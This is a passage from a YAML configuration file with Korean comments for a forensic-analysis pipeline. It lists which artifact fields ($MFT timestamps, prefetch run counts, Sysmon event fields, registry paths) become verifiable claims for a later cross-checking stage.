# 채운다. src/stage05_interpret/assembly.py 가 읽는다.
#
# **왜 어휘인가.** claims 는 06단계가 원본과 대조하는 유일한 대상이다. 어느
# 필드를 claim 으로 삼을지는 아티팩트마다 다르고(아래 참조), 새 파서가 붙을
# 때 함께 늘어야 한다. 코드에 박으면 add-parser 절차에서 빠뜨려도 아무 데도
# 안 남는다 — prompt_drop_fields 와 같은 이유다.
#
# **최상위와 fields 를 함께 적는다.** 실측(2026-09-03)에서 아티팩트마다
# 값이 사는 층이 다르다:
#
#   $UsnJrnl      fields 가 아예 없다. name·reason 이 전부 최상위다
#   prefetch      name 이 최상위, 나머지는 fields
#   registry:*    path·name 이 최상위
#   evtx:*        event_id·timestamp 가 최상위, 나머지는 fields
#   $MFT          path 와 si_*/fn_* 여덟이 최상위
#
# **하나도 없으면 claims 가 빈다.** 그 소견은 06단계에서 unverifiable 로
# 분류되고, 그것이 정직한 결과다 — 없는 필드를 지어내 채우면 그 순간
# 06단계가 우리가 만든 값을 검증하게 된다.
claim_fields:
  # 상한. claims 하나하나가 06 의 대조 한 번이라, 많을수록 좋은 것이 아니라
  # **문장이 실제로 주장하는 것**과 같아야 한다. 넷이면 "무엇이·어디서·
  # 언제·누가" 를 대개 덮는다.
  max_items: 4

  # 순서가 우선순위다. 경로·이름처럼 그 레코드를 특정하는 것이 앞이고,
  # 시각은 맨 뒤다 — 어느 레코드에나 있어서 앞에 두면 다른 필드를 밀어낸다.
  fields:
    - canonical.subject_path # artifact-neutral real file path (Amcache key path와 구분)
    - canonical.command_line
    - canonical.process_image
    - canonical.parent_image
    - canonical.event_time
    - path                    # $MFT, registry:*
    - name                    # $UsnJrnl, prefetch, registry:*
    - reason                  # $UsnJrnl — 이 아티팩트 판단의 핵심이다
    - fields.CommandLine      # evtx:Sysmon 1
    - fields.Image
    - fields.TargetFilename   # evtx:Sysmon 11
    - fields.TargetUserName   # evtx:Security 4720·4728·4732
    - fields.ParentImage
    - fields.DestinationIp    # evtx:Sysmon 3
    - fields.ServiceName

    # prefetch — "몇 번 실행됐나"가 이 아티팩트 판단의 핵심인데 빠져 있었다.
    # 실측(2026-09-03)에서 모델이 "자주 실행되며" 라고 쓴 소견의 claims 가
    # path·name·timestamp 였다. 문장이 기대는 값이 claims 에 없으면 그것이
    # 껍데기다.
    - fields.run_count
    - fields.loaded_file_count
    - fields.loaded_files       # list_contains typed assertion용; scalar claim에는 복사하지 않음
    # Python이 GUID 원문을 노출하지 않고 계산한 중립적 프로세스 관계 사실.
    # sLLM은 이 필드로 spawned/duration/count assertion을 구성한다.
    - incident_context.child_refs
    - incident_context.child_count
    - incident_context.children_within_2s
    - incident_context.stop_ref
    - incident_context.lifetime_seconds
    # 교차 아티팩트 동일성 조인의 압축 ref 목록. 실제 경로/해시는 06단계가
    # 원본 레코드에서 다시 대조한다.
    - incident_packet.same_path_refs
    - incident_packet.same_hash_refs

    # $MFT — 이 아티팩트의 flag 는 전부 이 값들에 기댄다. 빠뜨렸다가
    # 실측에서 드러났다(2026-09-03): timestamp_mismatch 가 붙은 레코드에
    # 모델이 고를 수 있는 이름이 path 하나뿐이라, 옆 레코드의 필드 이름을
    # 가져다 붙이고 재시도 세 번 끝에 중단했다.
    - si_ctime                # timestamp_mismatch·zero_timestamp 의 근거
    - si_mtime
    - si_btime
    - si_atime
    - fn_ctime                # $SI 와 어긋나는 것이 조작의 신호다
    - fn_mtime
    - fn_btime
    - allocated               # deleted 의 근거
    - size

    - event_id                # evtx:* — 무슨 사건이었나
    - timestamp
